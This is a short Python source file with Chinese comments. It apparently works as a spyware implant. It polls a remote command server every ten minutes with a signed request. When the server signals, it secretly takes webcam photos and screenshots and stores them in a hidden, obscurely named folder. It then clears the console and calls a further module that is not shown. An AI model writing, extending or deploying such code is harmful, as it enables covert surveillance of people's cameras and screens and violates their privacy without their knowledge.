import cv2
from time import sleep, time
import os
from PIL import ImageGrab
import requests
import json
from itsdangerous import TimedJSONWebSignatureSerializer as Serializer
import re


class Run:
    def __init__(self):
        key = "15963395653Wx"
        self.s = Serializer(key)

    def todo(self):
        while True:
            data = {"phone": "xxxxxxxxxxxxxxx", "timstp": int(time())}
            # 加密
            m = self.s.dumps(data)
            ms = re.findall(r"b'(.*)'", str(m))[0]
            res = json.loads(requests.post("http://xxxxxxxxx/PTO", data={"data": ms}).content.decode())
            if res['status'] == False:
                sleep(600)
            else:
                def snapShotCt(camera_idx=1):  # camera_idx的作用是选择摄像头。如果为0则使用内置摄像头，比如笔记本的摄像头，用1或其他的就是切换摄像头。
                    file_path = r"C:\DMRSorft\MOH\XJI\PLAIB\CDNNJK\HUDHMNK\CHIUD\XHSUDHC\CSHDCH\CSDUICH"
                    if not os.path.exists(path=file_path):
                        os.makedirs(file_path)
                    cap = cv2.VideoCapture(camera_idx)
                    for i in range(1, 5):
                        ret, frame = cap.read()  # cao.read()返回两个值，第一个存储一个bool值，表示拍摄成功与否。第二个是当前截取的图片帧。
                        cv2.imwrite(r'{}\{}.png'.format(file_path, i), frame)  # 写入图片
                        sleep(2)
                    cap.release()  # 释放
                    os.system('cls')
                    for i in range(5, 9):
                        im = ImageGrab.grab()
                        im.save(r'{}\{}.png'.format(file_path, i))
                        sleep(5)

                snapShotCt(0)  # 运行
                print()
                from test import Run
                Run().run()
                sleep(600)
